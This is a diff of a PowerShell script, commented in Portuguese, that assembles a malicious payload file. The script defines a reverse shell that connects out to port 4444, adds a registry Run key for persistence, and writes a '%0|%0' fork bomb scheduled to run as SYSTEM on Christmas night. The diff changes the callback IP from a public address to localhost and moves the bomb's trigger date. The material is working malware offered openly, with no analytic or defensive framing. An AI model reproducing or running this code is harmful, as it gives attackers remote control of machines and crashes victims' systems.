@@ -1,6 +1,6 @@
 # Define Payload de Shell-Reverso
 $x = @'
-$ip = '179.106.231.145';
+$ip = '127.0.0.1';
 $port = 4444;
 $TCPClient = New-Object Net.Sockets.TCPClient($ip, $port);
 $NetworkStream = $TCPClient.GetStream();
@@ -25,7 +25,7 @@ Write-Output 'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v pers
 # Monta a part do Fork Bomb no arquivo
 Write-Output '# Baixa o fork bomb e define para executar na noite de natal' >> .\payload.txt
 Write-Output 'echo "%0|%0" | out-file -encoding ascii C:\Windows\Temp\bomb.bat' >> .\payload.txt
-Write-Output 'schtasks /create /RU "system" /sc once /sd 25/12/2022 /st 22:45 /tr C:\Windows\Temp\bomb.bat /rl highest /tn "bomb"' >> .\payload.txt
+Write-Output 'schtasks /create /RU "system" /sc once /sd 24/12/2022 /st 22:45 /tr C:\Windows\Temp\bomb.bat /rl highest /tn "bomb"' >> .\payload.txt
 
 #Executa a shell reversa
 Write-Output '# Invoca a shell reversa' >> .\payload.txt
